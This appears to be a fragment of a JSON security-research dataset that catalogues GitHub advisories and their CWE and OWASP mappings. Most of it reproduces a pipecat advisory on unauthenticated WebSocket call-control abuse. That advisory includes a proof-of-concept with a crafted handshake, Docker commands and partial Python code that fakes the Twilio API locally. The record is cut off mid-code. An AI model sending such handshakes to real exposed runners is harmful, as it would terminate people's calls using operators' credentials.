+          "source_state_role": "vulnerable_parent_state",
+          "text": "\"net/http\"\n\t\"net/url\"\n\t\"strings\"\n\t\"testing\"\n\n\t\"github.com/brianvoe/gofakeit/v6\"\n\t\"github.com/monetr/monetr/server/datasources/lunch_flow\"\n\t\"github.com/stretchr/testify/assert\"\n\t\"github.com/stretchr/testify/require\"\n)\n\nconst (\n\t// TestInvalidAPIToken is always considered invalid if used in an API request\n\t// to the mock endpoints.\n\tTestInvalidAPIToken = \"test-token-that-is-always-invalid\"",
+          "text_sha256": "7507f239a4ac0e3bd7441a783f2989ef39090ef12c573e59c098d3da5f7daace"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "51860415764d21973f93abdb900db4d7d4c58c5c60c4b869e91c7c794da11c7e",
+            "filename": "server/internal/mock_lunch_flow/mock.go",
+            "fix_sha": "c260caa3c573a4a396ec2d264c7641a5d958385b",
+            "line_end": 18,
+            "line_start": 4
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "http://"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "\"net/http\"\n\t\"net/url\"\n\t\"strings\"\n\t\"testing\"\n\n\t\"github.com/brianvoe/gofakeit/v6\"\n\t\"github.com/monetr/monetr/server/config\"\n\t\"github.com/stretchr/testify/assert\"\n\t\"github.com/stretchr/testify/require\"\n)\n\nconst (\n\t// TestInvalidAPIToken is always considered invalid if used in an API request\n\t// to the mock endpoints.\n\tTestInvalidAPIToken = \"test-token-that-is-always-invalid\"",
+          "text_sha256": "0f677b98f94ffbc5dfedeb980e64e4f707aa8ede72fe91dac48291565e21885a"
+        }
+      ],
+      "scoring_executed": false,
+      "source_project": "monetr/monetr",
+      "source_replacement_used": false,
+      "source_root": "GHSA-29v9-frvh-c426",
+      "source_snapshot_sha256": "769d8754182d71d1b199bed6d95c6b15049607e5dd57b47fc5d888ce755dacf2",
+      "standards_rubric": {
+        "counts_as_target_evidence": false,
+        "cwe_ids": [
+          "CWE-209",
+          "CWE-489",
+          "CWE-319",
+          "CWE-749",
+          "CWE-548",
+          "CWE-444",
+          "CWE-1188"
+        ],
+        "owasp_ids": [
+          "API8:2023",
+          "A02:2025"
+        ],
+        "principle": "Configuration markers are only surfaces; promotion requires a directly observed insecure configuration and CWE is selected from the decisive configuration condition.",
+        "wstg_ids": [
+          "WSTG-CONF-02",
+          "WSTG-CONF-06",
+          "WSTG-CONF-07",
+          "WSTG-CONF-14",
+          "WSTG-ERRH-02"
+        ]
+      },
+      "target_contact_performed": false,
+      "third_party_code_executed": false,
+      "unclassified_record_count": 0,
+      "vulnerable_condition_record_count": 2,
+      "vulnerable_identity_or_surface_record_count": 9,
+      "vulnerable_state_record_count": 9,
+      "writeup_rubric_sha256": "86a0a6a59f8a8016870867587bc38bba6402da734e2dab8aa729e9688ad2bab8",
+      "writeups_count_as_target_evidence": false
+    },
+    {
+      "canonical_reference": "https://github.com/openclaw/openclaw/security/advisories/GHSA-6rmx-gvvg-vh6j",
+      "capture_id": "v7-sensitive_business_flow_abuse-positive",
+      "current_missing_requirements": [
+        "literal_decisive_condition"
+      ],
+      "engine_output_used": false,
+      "exact_revision_pair_identity_match": true,
+      "exact_revision_pair_present_in_historical_pack": true,
+      "exact_revision_pair_skipped_due_identity_mismatch": false,
+      "exact_revision_pair_used": true,
+      "family": "sensitive_business_flow_abuse",
+      "first_blind_consumed": false,
+      "fixed_state_record_count": 0,
+      "human_adjudication_performed": false,
+      "record_count": 0,
+      "records": [],
+      "scoring_executed": false,
+      "source_project": "openclaw/openclaw",
+      "source_replacement_used": false,
+      "source_root": "GHSA-6rmx-gvvg-vh6j",
+      "source_snapshot_sha256": "9cdbae92580b2f26c6af876f2d11bfa05cdbe9cb36ed9190ea6aa4d2ad75aae4",
+      "standards_rubric": {
+        "counts_as_target_evidence": false,
+        "cwe_ids": [
+          "CWE-799"
+        ],
+        "owasp_ids": [
+          "API6:2023",
+          "A06:2025"
+        ],
+        "principle": "Sensitive business flows are surfaces; promotion requires observed missing or bypassable interaction-frequency/anti-automation controls.",
+        "wstg_ids": [
+          "WSTG-BUSL-05",
+          "WSTG-BUSL-06",
+          "WSTG-BUSL-07"
+        ]
+      },
+      "target_contact_performed": false,
+      "third_party_code_executed": false,
+      "unclassified_record_count": 0,
+      "vulnerable_condition_record_count": 0,
+      "vulnerable_identity_or_surface_record_count": 0,
+      "vulnerable_state_record_count": 0,
+      "writeup_rubric_sha256": "9e24b1bb0f0a031bf52df0198a5a24d24f730e58299dd0c52d40b393de6f894e",
+      "writeups_count_as_target_evidence": false
+    },
+    {
+      "canonical_reference": "https://github.com/kubev2v/migration-planner",
+      "capture_id": "v7-sql_injection-positive",
+      "current_missing_requirements": [
+        "literal_decisive_condition",
+        "control_is_present_without_literal_override"
+      ],
+      "engine_output_used": false,
+      "exact_revision_pair_identity_match": true,
+      "exact_revision_pair_present_in_historical_pack": true,
+      "exact_revision_pair_skipped_due_identity_mismatch": false,
+      "exact_revision_pair_used": true,
+      "family": "sql_injection",
+      "first_blind_consumed": false,
+      "fixed_state_record_count": 0,
+      "human_adjudication_performed": false,
+      "record_count": 2,
+      "records": [
+        {
+          "heading": null,
+          "metadata": {
+            "canonical_reference": "https://github.com/kubev2v/migration-planner",
+            "snapshot_sha256": "68f8d88f0aa4b784762d34e237f5745796af2038d275aa68d2b20f17670ab37c",
+            "source_root": "GHSA-vf2h-7x3w-97fr"
+          },
+          "origin": "authoritative_advisory_summary",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "sql"
+            ]
+          },
+          "source_state_role": "unclassified_source_state",
+          "text": "Openshift Migration Advisor: Improper input sanitization allows specially crafted RVTools .xlsx files to include malicious SQL commands",
+          "text_sha256": "ec274f017a03da070c272b0b5bb430ba00bb1773f753be6a0f5f31ab4987aaa7"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "canonical_reference": "https://github.com/kubev2v/migration-planner",
+            "snapshot_sha256": "68f8d88f0aa4b784762d34e237f5745796af2038d275aa68d2b20f17670ab37c",
+            "source_root": "GHSA-vf2h-7x3w-97fr"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "sql"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "A flaw was found in migration-planner. A remote authenticated attacker could exploit this vulnerability by uploading a specially crafted RVTools .xlsx file. Due to improper input sanitization, malicious SQL embedded within a spreadsheet cell is executed when cluster names are processed. This SQL Injection allows for arbitrary file reading on the system, potentially exposing sensitive information such as Kubernetes service account tokens and other credentials, which could lead to a full compromise of the SaaS environment.",
+          "text_sha256": "6997434c28638a81e5fbee43a09b45ebf09917056bbacc825dd3498001c2e5ed"
+        }
+      ],
+      "scoring_executed": false,
+      "source_project": "kubev2v/migration-planner",
+      "source_replacement_used": false,
+      "source_root": "GHSA-vf2h-7x3w-97fr",
+      "source_snapshot_sha256": "68f8d88f0aa4b784762d34e237f5745796af2038d275aa68d2b20f17670ab37c",
+      "standards_rubric": {
+        "counts_as_target_evidence": false,
+        "cwe_ids": [
+          "CWE-89"
+        ],
+        "owasp_ids": [
+          "A05:2025"
+        ],
+        "principle": "Query parameters are only surfaces; promotion requires observed SQL semantic, error, boolean, timing, or unsafe-construction influence.",
+        "wstg_ids": [
+          "WSTG-INPV-05"
+        ]
+      },
+      "target_contact_performed": false,
+      "third_party_code_executed": false,
+      "unclassified_record_count": 1,
+      "vulnerable_condition_record_count": 0,
+      "vulnerable_identity_or_surface_record_count": 1,
+      "vulnerable_state_record_count": 1,
+      "writeup_rubric_sha256": "0159b318570faba3753b2620455770e73395a9431190047045782c4f69557a5a",
+      "writeups_count_as_target_evidence": false
+    },
+    {
+      "canonical_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+      "capture_id": "v7-websocket_authorization-positive",
+      "current_missing_requirements": [
+        "control_is_present_without_literal_override"
+      ],
+      "engine_output_used": false,
+      "exact_revision_pair_identity_match": true,
+      "exact_revision_pair_present_in_historical_pack": true,
+      "exact_revision_pair_skipped_due_identity_mismatch": false,
+      "exact_revision_pair_used": false,
+      "family": "websocket_authorization",
+      "first_blind_consumed": false,
+      "fixed_state_record_count": 1,
+      "human_adjudication_performed": false,
+      "record_count": 11,
+      "records": [
+        {
+          "heading": null,
+          "metadata": {
+            "canonical_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+            "snapshot_sha256": "89142d509e50f9b4c82ae9d6f5f2ac8d7e41dad61aabb03d1a59a66b46513bc3",
+            "source_root": "GHSA-j8cv-x86q-rj85"
+          },
+          "origin": "authoritative_advisory_summary",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "websocket"
+            ]
+          },
+          "source_state_role": "unclassified_source_state",
+          "text": "Pipecat: Telephony WebSocket `/ws` Unauthenticated Call-Control Abuse via Attacker-Supplied Call SID",
+          "text_sha256": "b9094f461cb75cdc28c14aca3e4228c0a921b40d1268a7663ed9af97196be057"
+        },
+        {
+          "heading": "Summary",
+          "metadata": {
+            "canonical_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+            "snapshot_sha256": "89142d509e50f9b4c82ae9d6f5f2ac8d7e41dad61aabb03d1a59a66b46513bc3",
+            "source_root": "GHSA-j8cv-x86q-rj85"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 1,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [
+              "authenticated_handshake"
+            ],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "websocket"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "The pipecat development runner registers a `/ws` WebSocket endpoint for telephony testing that accepts connections without any authentication. An unauthenticated remote attacker who can reach an exposed runner endpoint can connect to this endpoint, send a crafted Twilio handshake message containing an attacker-supplied `callSid`, and cause the server to issue an authenticated Twilio REST API hang-up request against that call SID using the server operator's own credentials. This may allow the attacker to forcibly terminate an active call on the victim's Twilio account if the attacker knows or obtains a valid call SID for that account. Equivalent unauthenticated call-control sinks exist for Telnyx and Plivo. Maintainers are evaluating the final CVSS 3.1 score.",
+          "text_sha256": "c2bc25bafd005d75477b2dc46303858ac901ab7b69a8a42eed6fd84fbb4a4967"
+        },
+        {
+          "heading": "Details",
+          "metadata": {
+            "canonical_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+            "snapshot_sha256": "89142d509e50f9b4c82ae9d6f5f2ac8d7e41dad61aabb03d1a59a66b46513bc3",
+            "source_root": "GHSA-j8cv-x86q-rj85"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 1,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [
+              "websocket_url"
+            ],
+            "override": [],
+            "surface": [
+              "websocket"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "The pipecat development runner registers a WebSocket route at `/ws` (`src/pipecat/runner/run.py:1116`). When a client connects, the server immediately accepts the connection without performing any authentication or signature verification (`run.py:1119`):\n\n```python\nawait websocket.accept()   # run.py:1119 \u2014 no auth check before this point\n```\n\nAfter acceptance, the server reads the Twilio WebSocket stream-start handshake and extracts the `callSid` field verbatim from the attacker-controlled JSON payload (`src/pipecat/runner/utils.py:223`):\n\n```python\ncall_id: start_data.get(\"callSid\")   # utils.py:223 \u2014 tainted, attacker-supplied\n```\n\nThe tainted `call_id` is then passed directly into `TwilioFrameSerializer` alongside the server's own Twilio account credentials, which are read from environment variables (`src/pipecat/runner/utils.py:513-517`):\n\n```python\nTwilioFrameSerializer(\n    stream_sid=stream_id,\n    call_sid=call_id,                          # TAINTED\n    account_sid=os.getenv(\"TWILIO_ACCOUNT_SID\"),  # server credential\n    auth_token=os.getenv(\"TWILIO_AUTH_TOKEN\"),     # server credential\n)\n```\n\n`TwilioFrameSerializer` has `auto_hang_up` defaulting to `True` (`src/pipecat/serializers/twilio.py:56`). When the pipeline terminates and serializes an `EndFrame` or `CancelFrame`, `_hang_up_call()` is triggered (`twilio.py:141-147`). This method constructs a Twilio REST API URL containing the attacker-supplied `call_sid` and POSTs to it using the server's own credentials (`twilio.py:196`, `twilio.py:206`):\n\n```\nPOST https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Calls/{attacker_call_sid}.json\nAuthorization: Basic <base64(account_sid:auth_token)>\nBody: Status=completed\n```\n\nThe same unauthenticated call-control pattern exists for Telnyx (`src/pipecat/serializers/telnyx.py:188`, `:195`) and Plivo (`src/pipecat/serializers/plivo.py:180`, `:187`).\n\nAlthough the runner defaults to `localhost` and is documented as a development runner, its telephony mode is commonly used with a public proxy hostname so that telephony providers can connect inbound calls. If the development runner is exposed to untrusted networks while configured with Twilio, Telnyx, or Plivo credentials, this becomes a realistic network-reachable attack surface.",
+          "text_sha256": "978df91d424a36c64e4c41f188a0270c7f7683a7f74d3f2dc5fef0df87931587"
+        },
+        {
+          "heading": "PoC",
+          "metadata": {
+            "canonical_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+            "snapshot_sha256": "89142d509e50f9b4c82ae9d6f5f2ac8d7e41dad61aabb03d1a59a66b46513bc3",
+            "source_root": "GHSA-j8cv-x86q-rj85"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 1,
+            "identity": 1,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "message_received_outside_scope"
+            ],
+            "control": [
+              "authenticated_handshake"
+            ],
+            "identity": [
+              "websocket_url"
+            ],
+            "override": [],
+            "surface": [
+              "websocket"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "**Prerequisites**\n\n- Docker (for building the isolated PoC image)\n- A clone of the pipecat repository at commit `b982b45a7ae1e5ee99e4390ad5a116cdd9b4a8e2` placed at `<context_root>/repo/`\n- The files `vuln-001/Dockerfile` and `vuln-001/poc.py` present under `<context_root>/`\n\n**Step 1 \u2014 Build the Docker image**\n\n```bash\ndocker build \\\n  -f vuln-001/Dockerfile \\\n  -t vuln001-poc \\\n  reports/pypiAi_247_pipecat-ai__pipecat\n```\n\nThe Dockerfile installs pipecat from the local repository clone, generates a self-signed TLS CA and server certificate for `api.twilio.com`, and registers that CA in the system trust store so that pipecat's `aiohttp`-based HTTP client accepts the mock server certificate.\n\n**Step 2 \u2014 Run the PoC**\n\n```bash\ndocker run --rm \\\n  --add-host api.twilio.com:127.0.0.1 \\\n  vuln001-poc\n```\n\nThe `--add-host` flag redirects DNS resolution for `api.twilio.com` to the loopback interface so all outgoing Twilio REST API calls hit the mock server instead of Twilio's real infrastructure.\n\n**What the PoC does**\n\n1. Starts a local TLS-enabled HTTP server on `127.0.0.1:443` that impersonates `api.twilio.com` and records every incoming POST request.\n2. Simulates the attacker-controlled WebSocket handshake message with an injected `callSid`:\n   ```json\n   {\"event\": \"start\", \"start\": {\"streamSid\": \"MX000...\", \"callSid\": \"CAATTACKER1337INJECTED00000000001\", \"customParameters\": {}}}\n   ```\n3. Runs the exact pipecat code path: parses `callSid` from attacker input (`utils.py:223`), constructs `TwilioFrameSerializer` with server credentials (`utils.py:513-517`), and calls `serialize(EndFrame())` which triggers `_hang_up_call()` (`twilio.py:141-147`, `:196`, `:206`).\n4. Verifies that the mock server received a POST whose URL contains the attacker-injected call SID.\n\n**Expected output (passing)**\n\n```\n[PASS] *** VULNERABILITY CONFIRMED ***\n[PASS] Attacker callSid 'CAATTACKER1337INJECTED00000000001' appears in Twilio REST API URL.\n[PASS] The server used its own credentials (account_sid=ACFAKE000000000000000000000000001)\n[PASS] to issue an authenticated hang-up command for the attacker-specified call SID.\n```\n\n**Observed intercepted request (Phase 2 dynamic reproduction)**\n\n```\nPOST https://api.twilio.com/2010-04-01/Accounts/ACFAKE000000000000000000000000001/Calls/CAATTACKER1337INJECTED00000000001.json\nAuthorization: Basic QUNGQUtFMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxOmZha2VfYXV0aF90b2tlbl9wb2Nfb25seQ==\nBody: Status=completed\n```\n\nDecoding the `Authorization` header confirms `ACFAKE000000000000000000000000001:fake_auth_token_poc_only` \u2014 the server's own credentials were used against the attacker-specified call SID.",
+          "text_sha256": "1128d811cfaf6dec134a8558b214119adc393affbe53528e2a913e69ab2bdcc5"
+        },
+        {
+          "heading": "Impact",
+          "metadata": {
+            "canonical_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+            "snapshot_sha256": "89142d509e50f9b4c82ae9d6f5f2ac8d7e41dad61aabb03d1a59a66b46513bc3",
+            "source_root": "GHSA-j8cv-x86q-rj85"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "websocket"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "This is a Missing Authorization vulnerability (CWE-862) in the development runner's telephony WebSocket handling. An unauthenticated network actor who can reach an exposed `/ws` WebSocket endpoint of a pipecat development runner configured with Twilio, Telnyx, or Plivo credentials may be able to:\n\n1. **Forcibly terminate active calls whose valid call-control identifiers are known or obtained** on the server operator's Twilio, Telnyx, or Plivo account by injecting the victim call identifier into the WebSocket handshake and then triggering pipeline termination.\n2. **Cause denial of service** against affected calls by repeatedly terminating calls for which the attacker has valid call-control identifiers.\n3. **Abuse the operator's telephony provider credentials** to perform call-control actions that the attacker does not have direct access to, effectively escalating privilege over the operator's telephony account.\n\nImpacted parties include operators who expose the pipecat development runner's telephony `/ws` endpoint on a publicly reachable host with Twilio, Telnyx, or Plivo credentials configured, and their customers whose active calls can be disrupted if a valid call-control identifier is known or obtained by an attacker.",
+          "text_sha256": "a0676035f4e109788c7b40a49d96975ee0bfc13918f631429cf4b441aadb8b7a"
+        },
+        {
+          "heading": "`Dockerfile`",
+          "metadata": {
+            "canonical_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+            "snapshot_sha256": "89142d509e50f9b4c82ae9d6f5f2ac8d7e41dad61aabb03d1a59a66b46513bc3",
+            "source_root": "GHSA-j8cv-x86q-rj85"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "websocket"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "```dockerfile\nFROM python:3.11-slim\n\nLABEL description=\"VULN-001 PoC: Telephony WebSocket /ws callSid injection (CWE-862)\"\n\nWORKDIR /poc",
+          "text_sha256": "e3ad61aaaafcdd47a45df6cffce8fb8a4738f1fd4d9b9bddf95cfd946eef7381"
+        },
+        {
+          "heading": "`poc.py`",
+          "metadata": {
+            "canonical_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+            "snapshot_sha256": "89142d509e50f9b4c82ae9d6f5f2ac8d7e41dad61aabb03d1a59a66b46513bc3",
+            "source_root": "GHSA-j8cv-x86q-rj85"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 1,
+            "identity": 1,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "message_received_outside_scope"
+            ],
+            "control": [
+              "authenticated_handshake"
+            ],
+            "identity": [
+              "websocket_url"
+            ],
+            "override": [],
+            "surface": [
+              "websocket"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "```python\n#!/usr/bin/env python3\n\"\"\"\nPoC for VULN-001: Telephony WebSocket /ws unauthenticated call-control abuse\nvia attacker-supplied call SID (CWE-862).\n\nVulnerability summary\n---------------------\nThe pipecat telephony runner registers a /ws WebSocket endpoint that accepts\nconnections without any authentication (run.py:1119).  When a client connects,\nthe server parses the Twilio \"start\" handshake message and extracts the callSid\nfield verbatim from the attacker-controlled payload (utils.py:223).  That\ncallSid is then injected into TwilioFrameSerializer together with the server's\nown Twilio credentials read from environment variables (utils.py:513-517).\nWhen the pipeline terminates and serializes an EndFrame, _hang_up_call() fires\nand issues a Twilio REST API POST with the attacker's callSid in the URL\n(twilio.py:196, :206), causing the server to hang up the attacker-specified\ncall SID if it identifies a valid call in the server's Twilio account.\n\nWhat this PoC does\n------------------\n1. Starts a local HTTPS server on 127.0.0.1:443 that impersonates api.twilio.com\n   and records every incoming POST request.  The TLS certificate was generated\n   in the Docker build stage and the CA was injected into the system trust store,\n   so aiohttp accepts it as legitimate.\n2. Ensures /etc/hosts resolves api.twilio.com to 127.0.0.1 so that aiohttp's\n   DNS lookup reaches the mock server instead of Twilio's real infrastructure.\n3. Reproduces the exact vulnerable code path from pipecat:\n     - Parses callSid from attacker-controlled input  (utils.py:223)\n     - Creates TwilioFrameSerializer(call_sid=<attacker_value>,\n                                     account_sid=TWILIO_ACCOUNT_SID,\n                                     auth_token=TWILIO_AUTH_TOKEN)\n                                                        (utils.py:513-517)\n     - Calls serialize(EndFrame()) which internally invokes _hang_up_call()\n                                                        (twilio.py:141-147)\n     - _hang_up_call() POSTs to https://api.twilio.com/.../Calls/{callSid}.json\n       using server-side Basic Auth credentials       (twilio.py:196, :206)\n4. Verifies that the mock server received a POST whose URL contains the\n   attacker-injected callSid, providing deterministic observable evidence.\n\nExpected pass criterion\n-----------------------\nThe intercepted POST path must contain ATTACKER_CALL_SID.  This proves that\nan attacker who connects to /ws and sends a crafted callSid can cause the\npipecat server to issue authenticated Twilio REST API calls against the call\nSID supplied by the attacker, using the server operator's credentials.\n\nRequirements\n------------\n- Run inside the Docker image built from the accompanying Dockerfile.\n- Start the container with --add-host api.twilio.com:127.0.0.1, OR run this\n  script as root so that /etc/hosts can be written programmatically.\n- Port 443 must be available (container runs as root by default).\n\"\"\"\n\nimport asyncio\nimport json\nimport os\nimport ssl\nimport sys\nimport threading\nimport time\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom pathlib import Path",
+          "text_sha256": "684afe70b440aea43d1f5aa11bfbe0829e2fa53e8495496a8344424199a0f126"
+        },
+        {
+          "heading": "Thread-safe storage for captured requests; set by the handler thread.",
+          "metadata": {
+            "canonical_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+            "snapshot_sha256": "89142d509e50f9b4c82ae9d6f5f2ac8d7e41dad61aabb03d1a59a66b46513bc3",
+            "source_root": "GHSA-j8cv-x86q-rj85"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "message_received_outside_scope"
+            ],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "socket"
+            ]
+          },
+          "source_state_role": "unclassified_source_state",
+          "text": "_intercepted_requests: list[dict] = []\n_request_received = threading.Event()\n\n\nclass MockTwilioAPIHandler(BaseHTTPRequestHandler):\n    \"\"\"\n    Minimal HTTP handler that records POST requests.\n\n    pipecat's _hang_up_call() issues exactly one POST request to:\n        https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Calls/{call_sid}.json\n    with Basic Auth (account_sid:auth_token) and body Status=completed.\n    This handler captures that request verbatim.\n    \"\"\"\n\n    def do_POST(self) -> None:\n        content_length = int(self.headers.get(\"Content-Length\", 0))\n        body = self.rfile.read(content_length).decode(\"utf-8\", errors=\"replace\")\n\n        captured = {\n            \"method\": \"POST\",\n            \"path\": self.path,\n            \"authorization\": self.headers.get(\"Authorization\", \"\"),\n            \"body\": body,\n        }\n        _intercepted_requests.append(captured)\n        _request_received.set()\n\n        print()\n        print(\"[MOCK TWILIO] *** Intercepted outgoing Twilio REST API call ***\")\n        print(f\"[MOCK TWILIO] POST https://api.twilio.com{self.path}\")\n        print(f\"[MOCK TWILIO] Authorization: {captured['authorization']}\")\n        print(f\"[MOCK TWILIO] Body: {body}\")\n        print()\n\n        # Respond with a minimal 200 JSON body that satisfies aiohttp's response parsing.\n        response_body = json.dumps({\"sid\": \"CA000000000000000000000000000001\",\n                                    \"status\": \"completed\"}).encode()\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"application/json\")\n        self.send_header(\"Content-Length\", str(len(response_body)))\n        self.end_headers()\n        self.wfile.write(response_body)\n\n    def log_message(self, fmt: str, *args) -> None:  # type: ignore[override]\n        # Suppress the default per-request stderr log line.\n        pass\n\n\ndef start_mock_twilio_server() -> HTTPServer:\n    \"\"\"\n    Start the mock Twilio HTTPS server in a daemon thread.\n\n    The server uses the TLS certificate generated at Docker build time.\n    That certificate is for api.twilio.com and is signed by the mock CA\n    that was added to the system trust store via update-ca-certificates,\n    so Python's ssl.create_default_context() (used by aiohttp) accepts it.\n    \"\"\"\n    cert_file = CERTS_DIR / \"server.crt\"\n    key_file = CERTS_DIR / \"server.key\"\n\n    if not cert_file.exists() or not key_file.exists():\n        print(f\"[ERROR] TLS certificates not found in {CERTS_DIR}\")\n        print(\"[ERROR] Rebuild the Docker image: the Dockerfile generates them at build time.\")\n        sys.exit(1)\n\n    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n    ssl_ctx.load_cert_chain(str(cert_file), str(key_file))\n\n    server = HTTPServer((MOCK_SERVER_HOST, MOCK_SERVER_PORT), MockTwilioAPIHandler)\n    server.socket = ssl_ctx.wrap_socket(server.socket, server_side=True)\n\n    thread = threading.Thread(target=server.serve_forever, daemon=True)\n    thread.start()\n    return server",
+          "text_sha256": "a1444e945646509b4a58db578e8903fce8ab559f55da4d1077641e3b530f7441"
+        },
+        {
+          "heading": "---------------------------------------------------------------------------",
+          "metadata": {
+            "canonical_reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+            "snapshot_sha256": "89142d509e50f9b4c82ae9d6f5f2ac8d7e41dad61aabb03d1a59a66b46513bc3",
+            "source_root": "GHSA-j8cv-x86q-rj85"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 1,
+            "identity": 1,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [
+              "authenticated_handshake"
+            ],
+            "identity": [
+              "websocket_url"
+            ],
+            "override": [],
+            "surface": [
+              "websocket"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "async def reproduce_attack() -> None:\n    \"\"\"\n    Reproduce the vulnerable pipecat code path step by step.\n\n    This function uses the real pipecat library (installed from the cloned\n    repository) and does NOT modify any source files.  The objective is to\n    show that pipecat's own code, given attacker-controlled input on /ws,\n    will issue an authenticated Twilio REST API call against the injected\n    callSid.\n    \"\"\"\n    # Import pipecat's actual serializer and frame types.\n    from pipecat.serializers.twilio import TwilioFrameSerializer\n    from pipecat.frames.frames import EndFrame\n\n    print()\n    print(\"=\" * 65)\n    print(\"Step 1 \u2014 Attacker-supplied WebSocket handshake (no auth check)\")\n    print(\"=\" * 65)\n    # This is what the attacker sends to /ws after the server calls\n    # await websocket.accept()  (run.py:1119 \u2014 no prior auth check).\n    attacker_ws_message = {\n        \"event\": \"start\",\n        \"start\": {\n            \"streamSid\": \"MX00000000000000000000000000000000\",\n            \"callSid\": ATTACKER_CALL_SID,   # <-- attacker-controlled\n            \"customParameters\": {}\n        }\n    }\n    print(f\"Attacker sends: {json.dumps(attacker_ws_message)}\")\n\n    print()\n    print(\"=\" * 65)\n    print(\"Step 2 \u2014 pipecat parses callSid from attacker message\")\n    print(\"         (mirrors utils.py:218-230)\")\n    print(\"=\" * 65)\n    # Reproduction of utils.py:219-230\n    start_data = attacker_ws_message[\"start\"]\n    call_id = start_data.get(\"callSid\")      # utils.py:223 \u2014 tainted value\n    stream_id = start_data.get(\"streamSid\")\n    print(f\"Parsed call_id (attacker-controlled): {call_id}\")\n    print(f\"Parsed stream_id:                     {stream_id}\")\n\n    print()\n    print(\"=\" * 65)\n    print(\"Step 3 \u2014 TwilioFrameSerializer created with attacker callSid\")\n    print(\"         + server-side Twilio credentials (utils.py:513-517)\")\n    print(\"=\" * 65)\n    print(f\"  call_sid    = {call_id!r}   [TAINTED: from attacker]\")\n    print(f\"  account_sid = {FAKE_ACCOUNT_SID!r}   [from TWILIO_ACCOUNT_SID env var]\")\n    print(f\"  auth_token  = 